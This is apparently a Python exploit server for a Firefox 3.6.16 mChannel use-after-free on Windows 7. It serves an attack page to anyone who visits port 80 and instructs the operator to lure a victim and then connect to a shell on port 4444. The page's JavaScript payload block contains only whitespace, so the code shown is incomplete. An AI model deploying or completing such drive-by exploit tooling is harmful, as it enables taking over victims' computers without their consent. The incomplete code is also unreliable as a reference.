#!/usr/bin/env python
# coding=utf-8
# Mozilla Firefox 3.6.16 mChannel Object Use After Free Exploit (Win7) by Mr_Me
try:  # Py2
    from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
except ImportError:  # Py3
    from http.server import BaseHTTPRequestHandler, HTTPServer


class myRequestHandler(BaseHTTPRequestHandler):
    try:
        def do_GET(self):
            # Always Accept GET
            self.printCustomHTTPResponse(200)

            if self.path == "/":
                target = self.client_address[0]
                self.wfile.write("""
<html>
<body>
<applet code="rubik.class" width=140 height=140></applet>
<p><b>Mozilla mChannel Object use after free</b><br />
- Found by regenrecht<br />
- MSF exploit by Rh0<br />
- Win 7 fun version by mr_me</p>
<!--
Notes:

- This exploit requires <= java 6 update 25.
- optimized heap spray and still works on mutiple tabs as
  the spray is large enough to hit the 0x10000000 block.
- If you really want the class file you can get it here:
  http://javaboutique.internet.com/Rubik/rubik.class,
  but java still loads without it.
- Tested on windows 7 ultimate (latest updates).
- http://bit.ly/qD4Jkc

-->
<object id="d"><object>
<script type="text/javascript">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
</script>
</body>
</html>
                """)

                self.wfile.write("""<title>Please wait...</title></head><body>""")
                self.wfile.write("""<left><body bgcolor="Black"><font color="White">
                Please wait<br>""")

                print(("\n\n[-] Exploit sent... [-]\n"
                       "[-] Wait about 30 seconds and attempt to connect.[-]\n"
                       "[-] Connect to IP Address: {0} and port 4444 [-]".format(target)))

        # Print custom HTTP Response
        def printCustomHTTPResponse(self, respcode):
            self.send_response(respcode)
            self.send_header("Content-type", "text/html")
            self.send_header("Server", "myRequestHandler")
            self.end_headers()

    # In case of exceptions, pass them
    except:
        pass


httpd = HTTPServer(('', 80), myRequestHandler)

print("""
 #####################################################################################
 # Mozilla Firefox 3.6.16 mChannel Object Use After Free Exploit (Win7) by Mr. Me.   #
 #####################################################################################
""")

print("    [-] Starting Mozilla Firefox 3.6.16 mChannel Object Use After Free Exploit (Win7) [-]")
print("    [-] Have someone connect to you on port 80 [-]")
print("\n\n    <ctrl>-c to Cancel")

try:
    # handle the connections
    httpd.handle_request()
    # Serve HTTP server forever
    httpd.serve_forever()
    # Except Keyboard Interrupts and throw custom message
except KeyboardInterrupt:
    print("\n\n    Exiting exploit...\n\n")
